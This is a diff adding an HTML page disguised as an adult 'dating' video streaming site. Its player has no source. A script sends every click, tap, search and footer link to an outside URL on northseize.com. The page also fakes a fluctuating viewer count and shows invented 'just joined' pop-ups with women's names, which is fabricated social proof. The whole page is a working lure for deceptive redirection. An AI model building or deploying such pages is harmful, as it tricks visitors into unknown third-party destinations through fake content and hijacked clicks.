@@ -1,0 +1,674 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>DATING - Streaming Premium</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100%;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background:
+        radial-gradient(circle at 50% 25%, #071528 0%, #030713 45%, #02050d 100%);
+      color: #fff;
+      min-height: 100vh;
+    }
+
+    /* NAVBAR */
+    .navbar {
+      width: 100%;
+      height: 58px;
+      background: #08090d;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0 10px;
+      border-bottom: 1px solid #111722;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .menu {
+      width: 28px;
+      height: 28px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 4px;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .menu span {
+      display: block;
+      width: 18px;
+      height: 2px;
+      background: #fff;
+      border-radius: 2px;
+    }
+
+    .logo {
+      font-size: 15px;
+      font-weight: 800;
+      color: #00c8f5;
+      letter-spacing: .3px;
+      white-space: nowrap;
+    }
+
+    .search {
+      flex: 1;
+      height: 32px;
+      background: #111217;
+      border-radius: 18px;
+      border: 1px solid #15171d;
+      color: #ddd;
+      outline: none;
+      padding: 0 15px;
+      font-size: 12px;
+      margin-left: 2px;
+    }
+
+    .search::placeholder {
+      color: #6d7079;
+    }
+
+    /* MAIN */
+    .main {
+      width: 100%;
+      min-height: calc(100vh - 58px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 45px 15px 25px;
+    }
+
+    /* VIDEO */
+    .video-box {
+      width: min(100%, 380px);
+      aspect-ratio: 16 / 9;
+      background: #000;
+      border-radius: 15px;
+      overflow: hidden;
+      position: relative;
+
+      box-shadow:
+        0 0 10px rgba(0, 160, 255, .20),
+        0 0 25px rgba(0, 100, 255, .13);
+
+      border: 1px solid rgba(0, 140, 255, .16);
+    }
+
+    .video-box video {
+      width: 100%;
+      height: 100%;
+      display: block;
+      object-fit: cover;
+      background: #000;
+    }
+
+    /* CONTENT */
+    .content {
+      width: min(100%, 380px);
+      text-align: center;
+    }
+
+    .title {
+      margin-top: 17px;
+      font-size: 23px;
+      font-weight: 800;
+      line-height: 1.2;
+    }
+
+    .watching {
+      margin-top: 18px;
+      font-size: 14px;
+      color: #00c9ff;
+    }
+
+    .watching .eye {
+      color: #fff;
+      margin-right: 7px;
+      font-size: 14px;
+    }
+
+    .notice {
+      margin-top: 13px;
+      font-size: 12px;
+      color: #b7b7b7;
+      line-height: 1.5;
+    }
+
+    .notice .warning {
+      color: #ffe000;
+      font-size: 13px;
+    }
+
+    /* SERVER BUTTONS */
+    .servers {
+      margin-top: 11px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .server-btn {
+      width: 100%;
+      height: 45px;
+      border: none;
+      border-radius: 12px;
+      background: #082941;
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+      transition: .2s ease;
+    }
+
+    .server-btn:hover {
+      background: #0b3857;
+      transform: translateY(-1px);
+    }
+
+    .server-btn:active {
+      transform: scale(.98);
+    }
+
+    .server-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 15px;
+      height: 15px;
+      margin-right: 7px;
+      background: #087fc1;
+      color: white;
+      font-size: 9px;
+      border-radius: 1px;
+    }
+
+    /* TELEGRAM */
+    .telegram {
+      margin-top: 10px;
+      width: 100%;
+      height: 44px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(90deg, #079bd8, #08b9ed);
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+      transition: .2s ease;
+    }
+
+    .telegram:hover {
+      filter: brightness(1.08);
+      transform: translateY(-1px);
+    }
+
+    .telegram-icon {
+      display: inline-block;
+      margin-right: 7px;
+      color: #000;
+      font-size: 13px;
+    }
+
+    /* FOOTER */
+    footer {
+      width: min(100%, 380px);
+      text-align: center;
+      margin-top: 25px;
+      padding-top: 28px;
+      border-top: 1px solid rgba(255,255,255,.08);
+    }
+
+    footer p {
+      font-size: 11px;
+      color: #999;
+      margin: 7px 0;
+    }
+
+    footer a {
+      color: #999;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      color: #00c8f5;
+    }
+
+    .brand-footer {
+      color: #00c8f5;
+      font-weight: bold;
+    }
+
+    .disclaimer {
+      color: #777;
+      font-size: 10px;
+      margin-top: 12px;
+    }
+
+    /* JOIN NOTIFICATION */
+    .join-notification {
+      position: fixed;
+      left: 8px;
+      bottom: 8px;
+
+      min-width: 108px;
+      max-width: 145px;
+
+      padding: 8px 10px;
+      background: rgba(15, 17, 23, .96);
+      border: 1px solid rgba(255,255,255,.07);
+      border-radius: 10px;
+
+      display: flex;
+      align-items: center;
+      gap: 8px;
+
+      box-shadow: 0 5px 20px rgba(0,0,0,.35);
+
+      transform: translateY(120px);
+      opacity: 0;
+      transition: .5s ease;
+
+      z-index: 9999;
+    }
+
+    .join-notification.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    .join-avatar {
+      width: 29px;
+      height: 29px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #444, #111);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      flex-shrink: 0;
+      font-size: 14px;
+    }
+
+    .join-text {
+      text-align: left;
+      line-height: 1.1;
+    }
+
+    .join-name {
+      font-size: 10px;
+      color: #00c8f5;
+      font-weight: bold;
+    }
+
+    .join-status {
+      font-size: 9px;
+      color: #ddd;
+      margin-top: 2px;
+    }
+
+    @media (max-width: 600px) {
+
+      .navbar {
+        height: 54px;
+      }
+
+      .main {
+        padding-top: 25px;
+        padding-left: 10px;
+        padding-right: 10px;
+      }
+
+      .video-box {
+        width: 100%;
+        max-width: 380px;
+        border-radius: 13px;
+      }
+
+      .content,
+      footer {
+        width: 100%;
+        max-width: 380px;
+      }
+
+      .title {
+        font-size: 21px;
+      }
+
+      .search {
+        font-size: 11px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- NAVBAR -->
+  <header class="navbar">
+
+    <div class="menu" onclick="openLink()">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <div class="logo">
+      DATING
+    </div>
+
+    <input
+      type="text"
+      class="search"
+      id="searchInput"
+      placeholder="Search videos..."
+      autocomplete="off"
+    >
+
+  </header>
+
+
+  <!-- MAIN -->
+  <main class="main">
+
+    <!-- VIDEO -->
+    <div class="video-box">
+
+      <video
+        id="mainVideo"
+        controls
+        playsinline
+        preload="metadata"
+      >
+        Your browser does not support video.
+      </video>
+
+    </div>
+
+
+    <div class="content">
+
+      <h1 class="title">
+        🔥 More Videos 🔥
+      </h1>
+
+
+      <div class="watching">
+        <span class="eye">👁</span>
+        <span id="viewerCount">12.962</span>
+        people watching
+      </div>
+
+
+      <div class="notice">
+        <span class="warning">⚠</span>
+        If the video cannot be opened, choose another server
+      </div>
+
+
+      <!-- SERVER -->
+      <div class="servers">
+
+        <button
+          class="server-btn"
+          onclick="openLink()"
+        >
+          <span class="server-icon">▶</span>
+          Server 1
+        </button>
+
+
+        <button
+          class="server-btn"
+          onclick="openLink()"
+        >
+          <span class="server-icon">▶</span>
+          Server 2
+        </button>
+
+
+        <button
+          class="server-btn"
+          onclick="openLink()"
+        >
+          <span class="server-icon">▶</span>
+          Server 3
+        </button>
+
+      </div>
+
+
+      <!-- TELEGRAM -->
+      <button
+        class="telegram"
+        onclick="openLink()"
+      >
+        <span class="telegram-icon">➤</span>
+        Join Telegram
+      </button>
+
+    </div>
+
+
+    <!-- FOOTER -->
+    <footer>
+
+      <p>
+        © 2026
+        <span class="brand-footer">Streaming Premium</span>.
+        All rights reserved.
+      </p>
+
+      <p>
+        <a href="#" onclick="openLink(); return false;">
+          Privacy Policy
+        </a>
+        •
+        <a href="#" onclick="openLink(); return false;">
+          Terms
+        </a>
+        •
+        <a href="#" onclick="openLink(); return false;">
+          Contact
+        </a>
+      </p>
+
+      <p class="disclaimer">
+        Disclaimer: For entertainment purposes only.
+      </p>
+
+    </footer>
+
+  </main>
+
+
+  <!-- JOIN NOTIFICATION -->
+  <div
+    class="join-notification"
+    id="joinNotification"
+  >
+
+    <div class="join-avatar">
+      👩
+    </div>
+
+    <div class="join-text">
+
+      <div
+        class="join-name"
+        id="joinName"
+      >
+        lavenia
+      </div>
+
+      <div class="join-status">
+        just joined
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <script>
+
+    /* =====================================
+       LINK TUJUAN
+    ===================================== */
+
+    const TARGET_LINK =
+      "https://northseize.com/up/31573404/index.php";
+
+
+    /* =====================================
+       SEMUA TOMBOL
+    ===================================== */
+
+    function openLink() {
+      window.location.href = TARGET_LINK;
+    }
+
+
+    /* =====================================
+       KLIK / TAP DI MANA SAJA
+       LANGSUNG REDIRECT
+    ===================================== */
+
+    document.addEventListener("click", function(event) {
+
+      /*
+       * Jika klik pada elemen yang sudah
+       * memiliki onclick="openLink()",
+       * biarkan fungsi tersebut bekerja.
+       */
+      if (event.target.closest(
+        ".menu, .server-btn, .telegram, footer a"
+      )) {
+        return;
+      }
+
+      /*
+       * Selain elemen di atas,
+       * klik di area mana pun akan redirect.
+       */
+      openLink();
+
+    });
+
+
+    /* =====================================
+       VIEWER COUNTER
+    ===================================== */
+
+    let viewers = 12962;
+
+    function updateViewers() {
+
+      const change =
+        Math.floor(Math.random() * 7) - 3;
+
+      viewers += change;
+
+      if (viewers < 12000) {
+        viewers = 12000;
+      }
+
+      document.getElementById("viewerCount")
+        .textContent =
+        viewers.toLocaleString("id-ID");
+    }
+
+    setInterval(updateViewers, 5000);
+
+
+    /* =====================================
+       JOIN NOTIFICATION
+    ===================================== */
+
+    const names = [
+      "lavenia",
+      "salsa",
+      "melani",
+      "citra",
+      "nabila",
+      "amelia",
+      "putri",
+      "dinda"
+    ];
+
+
+    function showJoinNotification() {
+
+      const notification =
+        document.getElementById(
+          "joinNotification"
+        );
+
+      const name =
+        names[
+          Math.floor(
+            Math.random() * names.length
+          )
+        ];
+
+      document.getElementById("joinName")
+        .textContent = name;
+
+      notification.classList.add("show");
+
+      setTimeout(function() {
+        notification.classList.remove("show");
+      }, 3500);
+    }
+
+
+    setTimeout(
+      showJoinNotification,
+      2500
+    );
+
+
+    setInterval(
+      showJoinNotification,
+      12000
+    );
+
+
+    /* =====================================
+       SEARCH
+    ===================================== */
+
+    document.getElementById(
+      "searchInput"
+    ).addEventListener(
+      "keypress",
+      function(event) {
+
+        if (event.key === "Enter") {
+          openLink();
+        }
+
+      }
+    );
+
+
+  </script>
+
+</body>
+</html>
